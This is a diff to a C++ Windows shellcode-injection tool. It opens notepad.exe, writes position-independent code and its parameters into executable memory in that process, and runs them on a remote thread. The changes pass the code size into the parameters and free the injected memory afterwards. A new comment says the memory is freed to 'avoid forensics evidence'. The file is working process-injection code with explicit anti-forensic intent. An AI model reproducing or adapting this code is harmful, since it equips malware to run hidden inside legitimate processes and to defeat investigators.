@@ -16,7 +16,7 @@
 
 
 void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID data, SIZE_T dataSize);
-PicParams getPicParameters();
+PicParams getPicParameters(SIZE_T picSize);
 
 const std::wstring targetProcessName(L"notepad.exe");
 
@@ -41,19 +41,19 @@ int wmain(int argc, PWCHAR argv[])
 		DEBUG_PRINT("[+] Allocate memory for PIC parameters in target process");
 
 
-		PicParams params = getPicParameters();
-
-
-		writeToTargetProcess(targetProcess.get(), remoteParamsMemoryGuard.get(), &params, sizeof(PicParams));
-		DEBUG_PRINT("[+] Write PIC parameters to target process at address: "
-			+ StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));
-
-
 		const int picBytesSize = reinterpret_cast<LPBYTE>(endPic) - reinterpret_cast<LPBYTE>(startPic);
 		if (0 >= picBytesSize)
 		{
 			throw std::runtime_error("Invalid PIC size");
 		}
+
+
+		PicParams params = getPicParameters(picBytesSize);
+
+
+		writeToTargetProcess(targetProcess.get(), remoteParamsMemoryGuard.get(), &params, sizeof(PicParams));
+		DEBUG_PRINT("[+] Write PIC parameters to target process at address: "
+			+ StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));
 
 
 		VirtualAllocExGuard remotePicMemoryGuard(targetProcess.get(), picBytesSize, PAGE_EXECUTE_READWRITE);
@@ -76,12 +76,16 @@ int wmain(int argc, PWCHAR argv[])
 		DEBUG_PRINT("[+] Create remote thread in target process TID=" + StringUtils::hexValue(threadId));
 
 
-		// The injection succeeded, so we don't want to destroy the memory:
-		remoteParamsMemoryGuard.release();
-		remotePicMemoryGuard.release();
-
-
 		WaitForSingleObject(targetThread.get(), INFINITE);
+
+		/*
+		 * VirtualAllocExGuard get called automatically in order to release
+		 * shellcode memory and avoid forensics evidence.
+		 * If you want to keep the remote allocation after the injection add:
+			remoteParamsMemoryGuard.release();
+			remotePicMemoryGuard.release();
+		* so we don't want to destroy the memory.
+		*/
 	}
 	catch (std::exception& exception)
 	{
@@ -101,7 +105,7 @@ void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID dat
 	}
 }
 
-PicParams getPicParameters()
+PicParams getPicParameters(SIZE_T picSize)
 {
 	PicParams params{ nullptr, nullptr };
 
@@ -112,6 +116,8 @@ PicParams getPicParameters()
 	{
 		throw std::runtime_error("Invalid PIC parameters");
 	}
+
+	params.picSize = picSize;
 
 	return params;
 }
